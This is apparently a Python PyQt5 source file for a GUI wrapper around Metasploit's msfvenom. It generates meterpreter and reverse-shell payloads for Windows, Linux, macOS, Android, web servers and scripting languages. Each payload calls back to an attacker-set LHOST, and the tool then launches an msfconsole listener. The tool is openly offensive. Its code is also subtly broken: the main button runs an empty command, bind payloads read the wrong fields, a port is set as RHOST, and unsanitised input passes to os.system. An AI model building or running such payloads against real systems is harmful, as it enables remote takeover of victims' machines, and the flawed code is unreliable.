#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @ Author: ssooking
# @ Blog  : www.cnblogs.com/ssooking
# @ Github: https://github.com/ssooking

import os
import sys

from PyQt5.QtGui import QFont,QIcon 
from PyQt5.QtWidgets import QWidget,QApplication,QMessageBox,QLabel,QComboBox,QPushButton,QRadioButton,QLineEdit,QFileDialog,QCheckBox
from PyQt5.QtCore import QRect,QCoreApplication,QMetaObject,Qt


#payload
windows_payloads = [
    'meterpreter/reverse_tcp',
    'meterpreter/bind_tcp',
    'messagebox'
]

# linux payloads 必须加arch，x86或x64
linux_payloads =[
    'meterpreter_reverse_tcp',
    'meterpreter/bind_tcp'
]

hta_payloads =[
    'meterpreter/reverse_tcp',
]

android_payloads = [
    'android/meterpreter/reverse_tcp'
]

# osx payloads 必须加arch，x86或x64
osx_payloads = [
    'meterpreter/reverse_tcp'
]

web_reverse_payloads = [
    'php',
    'asp',
    'jsp',
    'war'
]

script_reverse_payloads = [
    'bash',
    'python',
    'perl',
    'nodejs',
    'jar'
]

#global payloads settings
global msfvenom_command
global p_payload
global p_arch
global LHOST
global LPORT
global RHOST
global RPORT


class Ui_Form(object):
    def setupUi(self, Form):
        Form.setObjectName("Form")
        Form.resize(537, 428)
        font = QFont()
        font.setFamily("Cantarell")
        font.setStrikeOut(False)
        Form.setFont(font)
        self.label = QLabel(Form)
        self.label.setGeometry(QRect(20, 60, 101, 31))
        font = QFont()
        font.setPointSize(13)
        font.setBold(False)
        font.setWeight(50)
        self.label.setFont(font)
        self.label.setTextFormat(Qt.AutoText)
        self.label.setObjectName("label")
        self.label_2 = QLabel(Form)
        self.label_2.setGeometry(QRect(20, 120, 91, 21))
        font = QFont()
        font.setPointSize(13)
        font.setBold(False)
        font.setWeight(50)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")
        self.label_3 = QLabel(Form)
        self.label_3.setGeometry(QRect(20, 170, 91, 20))
        font = QFont()
        font.setPointSize(13)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")
        self.comboBox_platform = QComboBox(Form)
        self.comboBox_platform.setGeometry(QRect(130, 60, 181, 31))
        font = QFont()
        font.setStrikeOut(False)
        self.comboBox_platform.setFont(font)
        self.comboBox_platform.setMouseTracking(False)
        self.comboBox_platform.setAutoFillBackground(True)
        self.comboBox_platform.setObjectName("comboBox_platform")
        self.comboBox_platform.addItem("")
        self.comboBox_platform.addItem("")
        self.comboBox_platform.addItem("")
        self.comboBox_platform.addItem("")
        self.comboBox_platform.addItem("")
        self.comboBox_platform.addItem("")
        self.comboBox_platform.addItem("")
        self.pushButton = QPushButton(Form)
        self.pushButton.setGeometry(QRect(170, 340, 111, 41))
        self.pushButton.setObjectName("pushButton")
        self.pushButton_2 = QPushButton(Form)
        self.pushButton_2.setGeometry(QRect(430, 340, 71, 41))
        self.pushButton_2.setObjectName("pushButton_2")
        self.label_4 = QLabel(Form)
        self.label_4.setGeometry(QRect(70, 0, 451, 51))
        font = QFont()
        font.setFamily("Cantarell")
        font.setPointSize(16)
        font.setBold(True)
        font.setWeight(75)
        self.label_4.setFont(font)
        self.label_4.setObjectName("label_4")
        self.comboBox_payload = QComboBox(Form)
        self.comboBox_payload.setGeometry(QRect(130, 110, 271, 31))
        self.comboBox_payload.setObjectName("comboBox_payload")
        self.radioButton_86 = QRadioButton(Form)
        self.radioButton_86.setGeometry(QRect(130, 170, 119, 25))
        self.radioButton_86.setObjectName("radioButton_86")
        self.radioButton_64 = QRadioButton(Form)
        self.radioButton_64.setGeometry(QRect(250, 170, 119, 25))
        self.radioButton_64.setChecked(True)
        self.radioButton_64.setObjectName("radioButton_64")
        self.label_5 = QLabel(Form)
        self.label_5.setGeometry(QRect(20, 210, 91, 31))
        font = QFont()
        font.setPointSize(13)
        self.label_5.setFont(font)
        self.label_5.setObjectName("label_5")
        self.label_6 = QLabel(Form)
        self.label_6.setGeometry(QRect(290, 250, 71, 21))
        self.label_6.setObjectName("label_6")
        self.label_7 = QLabel(Form)
        self.label_7.setGeometry(QRect(290, 280, 71, 20))
        self.label_7.setObjectName("label_7")
        self.label_8 = QLabel(Form)
        self.label_8.setGeometry(QRect(60, 250, 71, 20))
        self.label_8.setObjectName("label_8")
        self.label_9 = QLabel(Form)
        self.label_9.setGeometry(QRect(60, 280, 71, 20))
        self.label_9.setObjectName("label_9")
        self.lineEdit_lhost = QLineEdit(Form)
        self.lineEdit_lhost.setGeometry(QRect(130, 250, 131, 21))
        self.lineEdit_lhost.setObjectName("lineEdit_lhost")
        self.lineEdit_lport = QLineEdit(Form)
        self.lineEdit_lport.setGeometry(QRect(130, 280, 131, 21))
        self.lineEdit_lport.setObjectName("lineEdit_lport")
        self.lineEdit_rhost = QLineEdit(Form)
        self.lineEdit_rhost.setGeometry(QRect(360, 250, 141, 21))
        self.lineEdit_rhost.setObjectName("lineEdit_rhost")
        self.lineEdit_rport = QLineEdit(Form)
        self.lineEdit_rport.setGeometry(QRect(360, 280, 141, 21))
        self.lineEdit_rport.setObjectName("lineEdit_rport")
        self.checkBox = QCheckBox(Form)
        self.checkBox.setGeometry(QRect(30, 350, 161, 25))
        font = QFont()
        font.setPointSize(12)
        self.checkBox.setFont(font)
        self.checkBox.setObjectName("checkBox")
        self.pushButton_3 = QPushButton(Form)
        self.pushButton_3.setGeometry(QRect(300, 340, 111, 41))
        self.pushButton_3.setObjectName("pushButton_3")

        self.retranslateUi(Form)
        self.comboBox_platform.currentIndexChanged['int'].connect(Form.setPlatform)
        self.pushButton_2.clicked.connect(Form.ExitTool)
        self.radioButton_86.clicked.connect(Form.setArch)
        self.radioButton_64.clicked.connect(Form.setArch)
        self.pushButton.clicked.connect(Form.GeneratePayload)
        self.pushButton_3.clicked.connect(Form.startMsfListener)
        QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        _translate = QCoreApplication.translate
        Form.setWindowTitle(_translate("Form", "Form"))
        self.label.setText(_translate("Form", "系统平台"))
        self.label_2.setText(_translate("Form", "攻击载荷"))
        self.label_3.setText(_translate("Form", "系统架构"))
        self.comboBox_platform.setItemText(0, _translate("Form", "Windows"))
        self.comboBox_platform.setItemText(1, _translate("Form", "HTA"))
        self.comboBox_platform.setItemText(2, _translate("Form", "Linux"))
        self.comboBox_platform.setItemText(3, _translate("Form", "MacOS-64"))
        self.comboBox_platform.setItemText(4, _translate("Form", "Android_x86_x64"))
        self.comboBox_platform.setItemText(5, _translate("Form", "Web_Reverse_Shell"))
        self.comboBox_platform.setItemText(6, _translate("Form", "Script_Reverse_Shell"))
        self.pushButton.setText(_translate("Form", "生成payload"))
        self.pushButton_2.setText(_translate("Form", "退出"))
        self.label_4.setText(_translate("Form", "msfvenom-gui  generate msf payloads"))
        self.radioButton_86.setText(_translate("Form", "x86"))
        self.radioButton_64.setText(_translate("Form", "x64"))
        self.label_5.setText(_translate("Form", "参数配置"))
        self.label_6.setText(_translate("Form", "RHOST"))
        self.label_7.setText(_translate("Form", "RPORT"))
        self.label_8.setText(_translate("Form", "LHOST"))
        self.label_9.setText(_translate("Form", "LPORT"))
        self.checkBox.setText(_translate("Form", "开启msf监听"))
        self.pushButton_3.setText(_translate("Form", "仅开启msf监听"))


class Mywindow(QWidget,Ui_Form):
    
    def __init__(self):    
        super(Mywindow,self).__init__()    
        self.setupUi(self)
        self.comboBox_payload.addItems(windows_payloads)
        self.msfvenom_command = ""
        self.p_arch = self.setArch()
        self.p_payload = ""
        self.LHOST=""
        self.LPORT=""
        self.RHOST=""
        self.RPORT=""

    #定义槽函数
    def setPlatform(self):
        if self.comboBox_platform.currentText()== "Windows":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(windows_payloads)
        
        elif self.comboBox_platform.currentText()== "HTA":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(hta_payloads)

        elif self.comboBox_platform.currentText()== "Linux":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(linux_payloads)

        elif self.comboBox_platform.currentText()== "Android_x86_x64":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(android_payloads)

        elif self.comboBox_platform.currentText()== "MacOS-64":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(osx_payloads)

        elif self.comboBox_platform.currentText()== "Web_Reverse_Shell":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(web_reverse_payloads)

        elif self.comboBox_platform.currentText()== "Script_Reverse_Shell":
            self.comboBox_payload.clear()
            self.comboBox_payload.addItems(script_reverse_payloads)

    def setArch(self):
        if self.radioButton_64.isChecked():
            return "x64"
        elif self.radioButton_86.isChecked():
            return "x86"
    
    def ExitTool(self):
        QCoreApplication.instance().quit()

    def GeneratePayload(self):

        try:
            file_name,ok=QFileDialog.getSaveFileName(self,'保存','/root')
            #file_name,ok=QFileDialog.getSaveFileName(self,'保存') 
            if ok: 
                _f=open(file_name,'w')    
        except :
            pass
        self.msfvenom_command = self.msfvenom_command + " -o" + file_name
        
        # debug infomation
        print(self.msfvenom_command)
        print(self.p_payload)
        print(self.LHOST,self.LPORT)
        print(self.RHOST,self.RPORT)

        QMessageBox.about(self,"正在生成",  "请确认生成payload,并等待成功提示...") 
        if os.system(self.msfvenom_command) == 0:
            QMessageBox.about(self,"OK",  "生成payload成功！Good Luck!")
        else:
            QMessageBox.about(self,"Failed",  "生成payload失败！再试试吧！")
        
        if self.checkBox.isChecked():
            self.startMsfListener()


    def startMsfListener(self):
        self.setPayloadSettings()
        # debug infomation
        print(self.msfvenom_command)
        print(self.p_payload)
        print(self.LHOST,self.LPORT)
        print(self.RHOST,self.RPORT)
        
        MSFListener_RC =[
            "use exploit/multi/handler",
            "set payload "+self.p_payload
        ]   
        if str.strip(self.LHOST)!="":
            MSFListener_RC.append("set LHOST "+self.LHOST)
            MSFListener_RC.append("set LPORT "+self.LPORT)
        elif str.strip(self.RHOST)!="":
            MSFListener_RC.append("set RHOST "+self.RHOST)
            MSFListener_RC.append("set RHOST "+self.RPORT)
        try:
            f = open('/tmp/msflistener.rc', 'w+', encoding='utf8')
            for i in range(len(MSFListener_RC)):
                #去除[],这两行按数据不同，可以选择
                s = str(MSFListener_RC[i]).replace('[','').replace(']','')
                #去除单引号，逗号，每行末尾追加换行符
                s = s.replace("'",'').replace(',','') +'\n'
                f.write(s)
            f.close()
        except :
            pass
        os.system("gnome-terminal -- msfconsole -r /tmp/msflistener.rc")

    def setPayloadSettings(self):
        #Windows payload
        if self.comboBox_platform.currentText()== "Windows":
            if self.comboBox_payload.currentText() == "messagebox":
                self.p_payload = "windows/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" TEXT="+"\'hello, it is a test\'"+" -f exe"
            
            elif self.comboBox_payload.currentText() == "meterpreter/bind_tcp":
                self.RHOST = self.lineEdit_rhost.text()
                self.RPORT = self.lineEdit_rport.text()
                if self.p_arch == 'x86':
                    self.p_payload = "windows/"+self.comboBox_payload.currentText()
                else:
                    self.p_payload = "windows/"+self.p_arch+"/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" RHOST="+ self.lineEdit_lhost.text()+ " RPORT="+ self.lineEdit_lport.text()+" -f exe"
            else:
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                if self.p_arch == 'x86':
                    self.p_payload = "windows/"+self.comboBox_payload.currentText()
                else:
                    self.p_payload = "windows/"+self.p_arch+"/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f exe"
        
        #Windows HTA payload
        elif self.comboBox_platform.currentText()== "HTA":
            self.LHOST = self.lineEdit_lhost.text()
            self.LPORT = self.lineEdit_lport.text()
            if self.p_arch == 'x86':
                self.p_payload = "windows/"+self.comboBox_payload.currentText()
            else:
                self.p_payload = "windows/"+self.p_arch+"/"+self.comboBox_payload.currentText()
            self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f hta-psh"

        #Linux payload
        elif self.comboBox_platform.currentText()== "Linux":
            if self.comboBox_payload.currentText() == "meterpreter/bind_tcp":
                self.RHOST = self.lineEdit_rhost.text()
                self.RPORT = self.lineEdit_rport.text()
                self.p_payload = "linux/"+self.p_arch+"/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" RHOST="+ self.lineEdit_lhost.text()+ " RPORT="+ self.lineEdit_lport.text()+" -f elf"
            else:
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "linux/"+self.p_arch+"/"+self.comboBox_payload.currentText()
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f elf"

        #Android payload
        elif self.comboBox_platform.currentText()== "Android_x86_x64":
            self.LHOST = self.lineEdit_lhost.text()
            self.LPORT = self.lineEdit_lport.text()
            self.p_payload = "android/"+self.comboBox_payload.currentText()
            self.msfvenom_command = "msfvenom" + " -a dalvik"+ " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"

        #MacOS payload
        elif self.comboBox_platform.currentText()== "MacOS-64":
            self.LHOST = self.lineEdit_lhost.text()
            self.LPORT = self.lineEdit_lport.text()
            self.p_payload = "osx/x64/"+self.comboBox_payload.currentText()
            self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f macho"

        #Web Reverse payload
        elif self.comboBox_platform.currentText()== "Web_Reverse_Shell":
            if self.comboBox_payload.currentText() == "php":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "php/meterpreter/reverse_tcp"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"

            elif self.comboBox_payload.currentText() == "jsp":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "java/jsp_shell_reverse_tcp"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"

            elif self.comboBox_payload.currentText() == "asp":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "windows/meterpreter/reverse_tcp"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f asp"

            elif self.comboBox_payload.currentText() == "war":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "java/jsp_shell_reverse_tcp"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f war"

        #Script Reverse payload
        elif self.comboBox_platform.currentText()== "Script_Reverse_Shell":
            if self.comboBox_payload.currentText() == "bash":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "cmd/unix/reverse_bash"
                self.msfvenom_command = "msfvenom" + " -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"
            elif self.comboBox_payload.currentText() == "python":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "python/meterpreter/reverse_tcp"
                self.msfvenom_command = "msfvenom"+" -a python"+" -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"
            elif self.comboBox_payload.currentText() == "perl":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "cmd/unix/reverse_perl"
                self.msfvenom_command = "msfvenom"+" -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"
            elif self.comboBox_payload.currentText() == "nodejs":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "cmd/unix/reverse_nodejs"
                self.msfvenom_command = "msfvenom"+" -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f raw"
            elif self.comboBox_payload.currentText() == "jar":
                self.LHOST = self.lineEdit_lhost.text()
                self.LPORT = self.lineEdit_lport.text()
                self.p_payload = "java/meterpreter/reverse_tcp"
                self.msfvenom_command = "msfvenom"+" -p "+self.p_payload+" LHOST="+ self.lineEdit_lhost.text()+ " LPORT="+ self.lineEdit_lport.text()+" -f jar"
def main():
    app = QApplication(sys.argv)
    window = Mywindow()
    window.setWindowTitle("by ssooking")
    window.setWindowIcon(QIcon('logo.jpg'))
    window.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()



        
